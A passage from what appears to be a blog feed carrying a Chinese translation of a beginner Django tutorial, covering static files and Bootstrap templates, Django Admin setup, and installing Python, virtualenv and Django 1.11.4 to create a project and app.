|         +-- bootstrap.min.css    &lt;-- here |    +-- manage.py +-- venv/</code></pre></figure><p>下一步是告诉Django在哪里可以找到静态文件。打开<strong>settings.py</strong>，拉到文件的底部，在<strong>STATIC_URL</strong>后面添加以下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="string">'/static/'</span></span><br><span class="line"></span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, <span class="string">'static'</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>TEMPLATES</strong>目录和这个配置是一样的</p><p>必须在模板中加载静态文件（Bootstrap CSS文件）：</p><p><strong>templates/home.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Board<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Posts<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Topics<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Last Post<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    &#123;% for board in boards %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                &#123;&#123; board.name &#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">small</span> <span class="attr">style</span>=<span class="string">"color: #888"</span>&gt;</span>&#123;&#123; board.description &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先，我们在模板的开头使用了 Static Files App 模板标签 <code>{% load static %}</code>。</p><p>模板标签<code>{% static %}</code>用于构成资源文件完整URL。在这种情况下，<code>{% static 'css/bootstrap.min.css' %}</code>将返回 <strong>/static/css/bootstrap.min.css</strong>，它相当于 <code>http://127.0.0.1:8000/static/css/bootstrap.min.css</code>。</p><p><code>{% static %}</code>模板标签使用 <strong>settings.py</strong>文件中的 <code>STATIC_URL</code> 配置来组成最终的URL，例如，如果您将静态文件托管在像 <code>https://static.example.com/</code> 这样的子域中 ，那么我们将设置 <code>STATIC_URL=https://static.example.com/</code>，然后 <code>{% static 'css/bootstrap.min.css' %}</code>返回的是 <code>https://static.example.com/css/bootstrap.min.css</code></p><p>但凡是需要引用CSS，JavaScript或图片文件的地方就使用<code>{% static %}</code>。稍后，当我们开始部署项目到正式环境时，我们将讨论更多。现在都设置好了。</p><p>刷新页面 <a href="http://127.0.0.1:8000" target="_blank" rel="noopener">http://127.0.0.1:8000</a> ，我们可以看到它可以正常运行：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django05.png" alt=""></p><p>现在我们可以编辑模板，以利用Bootstrap CSS：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb my-4"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thead</span> <span class="attr">class</span>=<span class="string">"thead-dark"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Board<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Posts<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Topics<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Last Post<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">          &#123;% for board in boards %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                &#123;&#123; board.name &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">"text-muted d-block"</span>&gt;</span>&#123;&#123; board.description &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"align-middle"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"align-middle"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>显示效果：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django06.png" alt=""></p><p>到目前为止，我们使用交互式控制台（python manage.py shell）添加了几个新的版块。但我们需要一个更好的方式来实现。接下来，我们将为网站管理员实现一个管理界面来管理这些数据。</p><h2 id="Django-Admin介绍"><a href="#Django-Admin介绍" class="headerlink" title="Django Admin介绍"></a>Django Admin介绍</h2><p>当我们开始一个新项目时，Django已经配置了<strong>Django Admin</strong>，这个应用程序列出的<code>INSTALLED_APPS</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django03.webp" alt=""></p><p>使用 Django Admin的一个很好的例子就是用在博客中; 它可以被作者用来编写和发布文章。另一个例子是电子商务网站，工作人员可以创建，编辑，删除产品。</p><p>现在，我们将配置 Django Admin 来维护我们应用程序的版块。</p><p>我们首先创建一个管理员帐户：</p><p><code>python manage.py createsuperuser</code></p><p>按照说明操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Username (leave blank to use &#39;vitorfs&#39;): admin</span><br><span class="line">Email address: admin@example.com</span><br><span class="line">Password:</span><br><span class="line">Password (again):</span><br><span class="line">Superuser created successfully.</span><br></pre></td></tr></table></figure><p>在浏览器中打开该URL：<code>http://127.0.0.1:8000/admin/</code></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django07.png" alt=""></p><p>输入用户名和密码登录到管理界面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django08.png" alt=""></p><p>它已经配置了一些功能。在这里，我们可以添加用户和组的权限管理，这些概念在后面我们将探讨更多。</p><p>添加Board模型非常简单。打开boards目录中的admin.py文件，并添加以下代码：</p><p><strong>boards/admin.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line">admin.site.register(Board)</span><br></pre></td></tr></table></figure><p>保存admin.py文件，然后刷新网页浏览器中的页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django09.png" alt=""></p><p>对！它已准备好被使用了。点击Boards链接查看现有版块列表：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django10.png" alt=""></p><p>我们可以通过点击 Add Board 按钮添加一个新的版块：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django11.png" alt=""></p><p>点击保存按钮：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django12.png" alt=""></p><p>我们可以检查一切是否正常，打开URL <code>http://127.0.0.1:8000</code></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django13.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本教程中，我们探讨学习了许多新概念。我们为项目定义了一些需求，创建了第一个模型，迁移了数据库，开始玩 Models API。我们创建了第一个视图并编写了一些单元测试。同时我们还配置了Django模板引擎，静态文件，并将Bootstrap 4库添加到项目中。最后，我们简要介绍了Django Admin界面。</p><p>这是学习的基础部分！下一部分，将学习探索Django的URL路由，表单API，可重用模板以及更多测试。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://simpleisbetterthancomplex.com/series/2017/09/11/a-complete-beginners-guide-to-django-part-2.html#figure-4" target="_blank" rel="noopener">https://simpleisbetterthancomplex.com/series/2017/09/11/a-complete-beginners-guide-to-django-part-2.html#figure-4</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Web框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django】1. Django入门与实践-入门</title>
      <link href="/2020/04/20/1.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%85%A5%E9%97%A8/"/>
      <url>/2020/04/20/1.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容：Django基础概念、环境搭建（python在ubuntu中安装，virtualenv虚拟环境安装，Django1.11.4安装）、创建一个简单的django项目，并创建了简单的初始应用程序</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天我将开始对一个关于Django基础知识的全新系列教程的学习。这是一个开始学习 Django 的完整入门指南。教程材料一共会被分为七个部分，将从安装，开发环境的准备、模型、视图、模板、URL到更高级的主题（如迁移、测试和部署）中详细探讨学习所有基本概念。</p><p>引用中国古代一句话开始新的实践学习<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django01.webp" alt=""></p><h2 id="为什么学习Django？"><a href="#为什么学习Django？" class="headerlink" title="为什么学习Django？"></a>为什么学习Django？</h2><p>Django是一个用python编写的Web框架。Web框架是一种软件，基于web框架可以开发动态网站，各种应用程序以及服务。它提供了一系列工具和功能，可以解决许多与Web开发相关的常见问题，比如：安全功能，数据库访问，会话，模板处理，URL路由，国际化，本地化，等等。</p><p>使用诸如 Django 之类的网络框架，使我们能够以标准化的方式快速开发安全可靠的Web应用程序，而无需重新发明轮子。</p><p>那么，Django有什么特别之处呢？对于初学者来说，它是一个Python Web框架，这意味着你可以受益于各种各样的<strong>开源库包</strong>。python软件包资料库（pypi）拥有超过11.6万个软件包（2017年9月6日的数据）。如果当你想要解决一个特定的问题的时候，可能有人已经为它实现了一个库来供你使用。</p><p>Django是用python编写的最流行的web框架之一。它绝对是最完整的，提供了各种各样的<strong>开箱即用</strong>的功能，比如用于开发和测试的独立Web服务器，缓存，中间件系统，ORM，模板引擎，表单处理，基于Python单元测试的工具接口。Django还自带内部电池，提供内置应用程序，比如一个认证系统，一个可用于 CRUD(增删改查) 操作并且自动生成页面的后台管理界面，生成订阅文档（RSS/Atom）,站点地图等。甚至在django中内建了一个地理信息系统（GIS）框架。</p><p>Django的开发得到了Django软件基金会的支持，并且由jetbrains和instagram等公司赞助。Django现在已经存在了相当长的一段时间了。到现在为止，活跃的项目开发时间超过13年，这也证明了它是一个<strong>成熟，可靠和安全</strong>的网络框架。</p><h2 id="谁在使用Django？"><a href="#谁在使用Django？" class="headerlink" title="谁在使用Django？"></a>谁在使用Django？</h2><p>知道谁在使用Django是很好的，同时也想一想你可以用它来做些什么。在使用Django的大型网站有：Instagram，Disqus，Mozilla，Bitbucket，Last.fm，国家地理等。</p><p>想知道更多的示例，你可以到Django Sites数据库中查看，它提供超过五千个Django驱动的网站列表。</p><p>顺便说一下，去年在Django 2016年发布会上，Django核心开发人员，Instagram员工carl meyer，就Instagram如何大规模使用Django以及它如何支持他们的用户增长做过一次分享。这是个一小时的演讲，如果你有兴趣学习了解更多的话，这是一次很有趣的演讲。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>电脑上安装一些程序，以便使用django。基本的设置包括安装Python，Virtualenv和Django。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django02.webp" alt=""></p><ul><li>使用虚拟环境，使得在进行项目开发的时，便于使得每个项目会有独立的环境。这样在用Django开发一个网站或Web项目时，安装外部库，不用担心包之间的依赖关系发生冲突。同时，也可使得能够在不同Django版本上运行的本地机器的项目。</li></ul><h3 id="python安装"><a href="#python安装" class="headerlink" title="python安装"></a>python安装</h3><ul><li>python版本选择</li></ul><blockquote><p>本教程选择python版本为3.6.2以上，也可以使用最新python版本</p></blockquote><pre><code>使用Python3，因为大部分主要的Python库已经被移植到python 3，并且下一个主要的django版本（2.x）也将不再支持python 2。所以Python 3是正确的选择。</code></pre><ul><li>本文使用ubuntu16.04进行python的安装，由于ubuntu中python版本分别为python2.7和python3.5.2</li></ul><h4 id="python-3-6-10安装"><a href="#python-3-6-10安装" class="headerlink" title="python 3.6.10安装"></a>python 3.6.10安装</h4><ol><li><p>安装Python软件工具</p><p> sudo apt-get install python-software-properties</p></li><li><p>添加仓库镜像源</p><p> sudo add-apt-repository ppa:fkrull/deadsnakes</p></li><li><p>更新源</p><p> sudo apt-get update</p></li><li><p>从本地仓库安装python</p><p> sudo apt-get install python3.6</p></li></ol><ul><li>终端输入python3.6,启动</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django03.png" alt=""></p><h3 id="安装-Virtualenv"><a href="#安装-Virtualenv" class="headerlink" title="安装 Virtualenv"></a>安装 Virtualenv</h3><p>通过pip(一个管理和安装Python包的工具)来安装Virtualenv。</p><ol><li><p>查看ubuntu中pip是否安装，默认的pip为Python2的</p><p> pip –version</p></li><li><p>安装pip3</p><p> apt install python3-pip</p></li><li><p>终端执行下面命令：(安装virtualenv）</p><p> <font color=#FF000>sudo pip3 install virtualenv</font></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django04.png" alt=""></p><p>到目前为止，我们执行的安装都是在操作系统环境下运行的。从现在开始，我们安装的所有东西，包括django本身，都将安装在虚拟环境中。</p><p>这样想一下：对于你开始的每个Django项目，你首先会为它创建一个虚拟环境。这就像每个Django项目都有一个沙盒。所以你随意运行，安装软件包，卸载软件包而不会破坏任何东西。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django05.png" alt=""></p><ul><li>virtualenv使用</li></ul><p>创建一个Development文件夹，用其组织自己的项目和网站</p><ol><li><p>为一个工程创建一个虚拟环境</p><p> mkdir myproject<br> cd myproject</p></li><li><p>这个文件夹是级别较高的目录，将存储与我们的Django项目相关的所有文件和东西，包括它的虚拟环境。所以让我们开始创建我们的第一个虚拟环境并安装django。</p></li><li><p>在myproject文件夹中：</p><p> virtualenv venv -p python3.6</p><p> venv是虚拟环境的目录名，-p参数指定python3.6解析器的路径</p></li><li><p>要开始使用虚拟环境，其需要被激活： </p><p> source venv/bin/activate</p></li></ol><p>当在命令行前看到(venv),就代表激活成功，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django06.png" alt=""></p><p>当我们venv开启后，pip程序也安装了，当使用期安装Python软件包（比如Django）时，它将安装在venv环境中</p><p>值得注意的是，在venv环境中，使用命令python（而不是python3.6）来调用python3.6.10，并且仅使用pip（而不是pip3）来安装软件包。</p><ol start="5"><li><p>退出<strong>venv</strong>环境，使用命令：</p><p> deactivate</p></li></ol><h3 id="安装Django-1-11-4"><a href="#安装Django-1-11-4" class="headerlink" title="安装Django 1.11.4"></a>安装Django 1.11.4</h3><p>很简单，现在我们已经启动了venv，运行以下命令来安装django</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pip install django&#x3D;&#x3D;1.11.4</span><br><span class="line"></span><br><span class="line"># 译注：目前django已经升级到2.x版本，这里为了跟后续教程内容保持一直，所以必须指定版本号进行安装</span><br><span class="line"># 除非你有能力 debug，否则不建议你使用django 2.x，等你熟悉Django后，再升级都Django2.0 也不迟，因为两个版本的差异非常小</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django07.png" alt=""></p><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>一切就绪<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django08.webp" alt=""></p><h3 id="启动一个新项目"><a href="#启动一个新项目" class="headerlink" title="启动一个新项目"></a>启动一个新项目</h3><ol><li>执行下面的命令来创建一个新的 Django 项目：</li></ol><figure class="highlight"><pre><code class="language-bash" data-lang="bash">django-admin startproject myproject</code></pre></figure>    命令行工具django-admin会在安装Django的时候一起自动安装好。<pre><code>执行了上面的命令以后，系统会为Django项目生成基础文件夹结构</code></pre><ol start="2"><li>myproject目录结构如下所示：</li></ol><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/                  &lt;-- 高级别文件夹 |-- myproject/             &lt;-- Django项目文件夹 |    |-- myproject/ |    |    |-- __init__.py |    |    |-- settings.py |    |    |-- urls.py |    |    |-- wsgi.py |    +-- manage.py +-- venv/                  &lt;-- 虚拟环境文件夹  </code></pre></figure><ol start="3"><li>最初的项目结构由五个文件组成：</li></ol><ul><li><p><strong>manage.py</strong>：使用<strong>django-admin</strong>命令行工具的快捷方式。它用于运行与我们项目相关的管理命令。我们将使用它来运行开发服务器，运行测试，创建迁移等等。</p></li><li><p><strong><code>__init__.py</code></strong>：这个空文件告诉python这个文件夹是一个python包</p></li><li><p><strong>settings.py</strong>：这个文件包含了所有的项目配置。将来我们会一直提到这个文件！</p></li><li><p><strong>urls.py</strong>：这个文件负责映射我们项目中的路由和路径。例如，如果你想在访问URL / about/ 时显示某些内容，则必须先在这里做映射关系。</p></li><li><p><strong>wsgi.py</strong>：该文件是用于部署的简单网关接口。你可以暂且先不用关心她的内容，就先让他在那里就好了。</p></li></ul><p>django自带了一个简单的网络服务器。在开发过程中非常方便，所以我们无需安装任何其他软件即可在本地运行项目。我们可以通过执行命令来测试一下它：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py runserver</code></pre></figure>结果图：![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django09.png)<p>现在，你可以忽略终端中出现的迁移错误;我们将在稍后讨论。</p><p>现在在Web浏览器中打开URL：<code>http://127.0.0.1:8000</code>，你应该看到下面的页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django10.png" alt=""></p><p>使用组合键 Control + C来终止开发服务器。</p><h2 id="Django应用"><a href="#Django应用" class="headerlink" title="Django应用"></a>Django应用</h2><p>在Django的哲学中，我们有两个重要的概念：</p><ul><li><p><strong>app</strong>：是一个可以完成某件事情的Web应用程序。一个应用程序通常由一组<strong>models(数据库表)，views(视图)，templates(模板)，tests(测试)</strong>组成。</p></li><li><p><strong>project</strong>：是配置和应用程序的集合。一个项目可以由多个应用程序或一个应用程序组成。</p></li></ul><p>请注意，如果没有一个project，你就无法运行Django应用程序。像博客这样的简单网站可以完全在单个应用程序中编写，例如可以将其命名为blog或weblog。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django11.webp" alt=""></p><p>这是组织源代码的一种方式。现在刚开始，判断什么是或不是应用程序这些还不太重要。包括如何组织代码等。现在不用担心那些问题！首先让我们对Django的API和基础知识进行梳理一遍。</p><p>为了方便说明，我们来创建一个简单的<em>网络论坛或讨论区</em>。要创建我们的第一个应用程序，请跳转到<strong>manage.py</strong>文件所在的目录并执行以下命令：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">django-admin startapp boards</code></pre></figure>注意!我们这次使用的命令是**startapp**。<p>通过这条指令，系统会给我们创建以下目录结构：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/                &lt;-- 我们新的Django应用（app）！ |    |    |-- migrations/ |    |    |    +-- __init__.py |    |    |-- __init__.py |    |    |-- admin.py |    |    |-- apps.py |    |    |-- models.py |    |    |-- tests.py |    |    +-- views.py |    |-- myproject/ |    |    |-- __init__.py |    |    |-- settings.py |    |    |-- urls.py |    |    |-- wsgi.py |    +-- manage.py +-- venv/</code></pre></figure><p>下面，我们来探讨每个文件的作用：</p><ul><li><p><strong>migrations/</strong>：在这个文件夹里，Django会存储一些文件以跟踪你在<strong>models.py</strong>文件中创建的变更，用来保持数据库和models.py的同步。</p></li><li><p><strong>admin.py</strong>：这个文件为一个django内置的应用程序<strong>Django Admin</strong>的配置文件。</p></li><li><p><strong>apps.py</strong>：这是应用程序本身的配置文件。</p></li><li><p><strong>models.py</strong>：这里是我们定义Web应用程序数据实例的地方。models会由Django自动转换为数据库表。</p></li><li><p><strong>tests.py</strong>：这个文件用来写当前应用程序的单元测试。</p></li><li><p><strong>views.py</strong>：这是我们处理Web应用程序请求(request)/响应(resopnse)周期的文件。</p></li></ul><p>现在我们创建了我们的第一个应用程序，让我们来配置一下项目以便启用这个应用程序。</p><p>要做到这一点，打开<strong>settings.py</strong>并尝试找到<code>INSTALLED_APPS</code>变量：</p><p><strong>settings.py</strong></p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">INSTALLED_APPS</span> <span class="o">=</span> <span class="p">[</span>    <span class="s">'django.contrib.admin'</span><span class="p">,</span>    <span class="s">'django.contrib.auth'</span><span class="p">,</span>    <span class="s">'django.contrib.contenttypes'</span><span class="p">,</span>    <span class="s">'django.contrib.sessions'</span><span class="p">,</span>    <span class="s">'django.contrib.messages'</span><span class="p">,</span>    <span class="s">'django.contrib.staticfiles'</span><span class="p">,</span><span class="p">]</span></code></pre></figure><p>如你所见，Django默认已经安装了6个内置应用程序。它们提供大多数Web应用程序所需的常用功能，如身份验证，会话，静态文件管理（图像，JavaScript，CSS等）等。</p><p>我们将会在本系列教程中探索这些应用程序。但现在，先不管它们，只需将我们的应用程序<strong>boards</strong>添加到<code>INSTALLED_APPS</code>列表即可</p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">INSTALLED_APPS</span> <span class="o">=</span> <span class="p">[</span>    <span class="s">'django.contrib.admin'</span><span class="p">,</span>    <span class="s">'django.contrib.auth'</span><span class="p">,</span>    <span class="s">'django.contrib.contenttypes'</span><span class="p">,</span>    <span 